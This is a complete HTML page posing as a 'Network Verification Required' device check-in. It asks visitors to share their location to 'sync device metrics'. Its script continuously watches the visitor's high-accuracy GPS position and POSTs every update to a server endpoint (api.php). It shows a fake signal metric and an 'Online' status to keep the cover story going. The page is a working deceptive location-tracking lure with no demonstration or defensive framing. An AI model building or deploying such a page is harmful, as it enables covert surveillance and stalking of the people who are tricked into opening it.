<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Network Check-in</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: #f0f2f5; }
        .box { background: white; max-width: 400px; margin: 0 auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .btn { background: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box">
        <h3>Network Verification Required</h3>
        <p>Please open your location to proceed and sync device metrics with the session host.</p>
        <button class="btn" onclick="startTracking()">Share Location & Sync</button>
        <p id="statusMsg" style="margin-top: 15px; font-weight: bold;"></p>
    </div>

    <script>
        const deviceId = 'device_' + Math.floor(Math.random() * 10000);

        function startTracking() {
            const status = document.getElementById('statusMsg');

            if (!navigator.geolocation) {
                status.innerText = "Geolocation is not supported by your device browser.";
                return;
            }

            status.innerText = "Acquiring positioning metrics...";

            // Continuously stream location changes
            navigator.geolocation.watchPosition(
                (position) => {
                    const payload = {
                        deviceId: deviceId,
                        name: "Mobile Client " + deviceId.slice(-4),
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        signalPercentage: Math.floor(Math.random() * 20) + 80 // Simulated metric
                    };

                    fetch('api.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    })
                    .then(res => res.json())
                    .then(data => {
                        status.innerText = "Location active. Sync status: Online 💯";
                    });
                },
                (error) => {
                    status.innerText = "Permission required. Please grant location access in browser settings.";
                },
                { enableHighAccuracy: true }
            );
        }
    </script>
</body>
</html>
